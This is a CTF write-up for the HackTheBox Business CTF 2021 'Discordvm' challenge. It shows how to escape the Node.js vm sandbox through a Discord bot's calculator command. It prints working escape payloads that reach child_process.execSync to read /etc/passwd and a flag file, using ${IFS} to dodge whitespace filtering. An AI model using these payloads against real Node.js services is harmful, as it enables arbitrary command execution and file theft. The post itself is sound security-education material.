---
title: "HackTheBox Business CTF 2021 - Discordvm (Misc)"
classes: wide
header:
  teaser: /assets/images/htb-frame.png
search: true
categories: 
  - HackTheBox
  - HackTheBox Business CTF 2021
  - CTF
tags:
  - HackTheBox Business CTF 2021
last_modified_at: 2021-07-26T26:58:26+08:00
---

`Discordvm` is a misc challenge from [HackTheBox Business CTF 2021](https://www.hackthebox.eu/htb-business-ctf-2021?utm_source=website&utm_medium=banner&utm_campaign=business_ctf). This challenge is talking about how to vm module breakout on nodejs.

Click challenge information
![Discordvm](/assets/images/htbbiz2021-discordvm/discordvm.png)

Click the url, it will navigate to a discord channel
![Discordvm](/assets/images/htbbiz2021-discordvm/discordvm2.png)

Let's send a message to `discordvm`
![Discordvm](/assets/images/htbbiz2021-discordvm/discordvm3.png)

when we to execute the program using with `!calc`, for example `!calc 1+1` will show the output from `discordvm` `1+1=2`.
Let's analyze the source codes
```javascript
const vm = require('vm');
const payload = '1+1';
console.log(vm.runInNewContext(payload));
```
and we follow the intructions from [NodeJS Red Team Cheat Sheet](https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet) or [Sandboxing NodeJS is hard, here is why](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html)

**vm module breakout (by pwnisher)**
```js
"use strict";
const vm = require("vm");
const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()`);
console.log(xyz);
```
we need this `const`
```js
process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()
```
we got an error
![Discordvm](/assets/images/htbbiz2021-discordvm/discordvm4.png)

modify without whitespace like this
```js
process=this.constructor.constructor('return(this.process)')();process.mainModule.require('child_process').execSync('cat${IFS}flag.txt').toString()
```
![Discordvm](/assets/images/htbbiz2021-discordvm/discordvm5.png)
